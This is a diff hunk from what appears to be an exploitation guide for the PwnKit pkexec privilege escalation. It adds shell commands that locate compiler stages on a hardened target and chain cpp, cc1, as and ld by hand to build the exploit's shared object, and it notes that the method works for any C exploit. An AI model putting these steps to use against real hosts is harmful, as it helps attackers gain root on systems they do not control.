@@ -49,6 +49,26 @@ docker run --rm -v $PWD:/work -w /work --platform linux/amd64 gcc:10 \
   sh -c 'gcc -shared -fPIC -o pwnkit.so pwnkit.c -w'
 ```
 
+**No `gcc` driver but the toolchain pieces exist.** Many hardened/minimal hosts ship the backend compiler stages (`cpp`, `cc1`, `as`, `ld`) without the `gcc` front-end driver — so `gcc` is "not found" yet on-box compilation is still possible. Check before assuming you must cross-compile:
+
+```bash
+for b in gcc cc clang cc1 as ld cpp; do command -v $b 2>/dev/null \
+  || find / -name "$b" -type f 2>/dev/null | head -1; done
+ls /usr/lib/gcc/*/*/cc1 /usr/libexec/gcc/*/*/cc1 2>/dev/null   # cc1 is rarely on PATH
+```
+
+If `cc1`, `as`, and `ld` are present, drive them by hand to build the `.so` (preprocess → compile → assemble → link as a shared object):
+
+```bash
+CC1=$(ls /usr/lib*/gcc/*/*/cc1 2>/dev/null | head -1)
+cpp -fPIC pwnkit.c > pwnkit.i
+"$CC1" -fPIC -O2 pwnkit.i -o pwnkit.s
+as pwnkit.s -o pwnkit.o
+ld -shared pwnkit.o -o pwnkit.so      # add -lc / crt objects only if libc symbols fail to resolve
+```
+
+Wrap the four calls in a `gcc` shim on `$PATH` if a build script insists on invoking `gcc`. This same technique compiles any C exploit (kernel LPE, SUID payloads), not just PwnKit.
+
 Stage on target + invoke pkexec with NULL argv (ctypes is needed because Python's `os.execve` doesn't accept NULL argv):
 
 ```bash
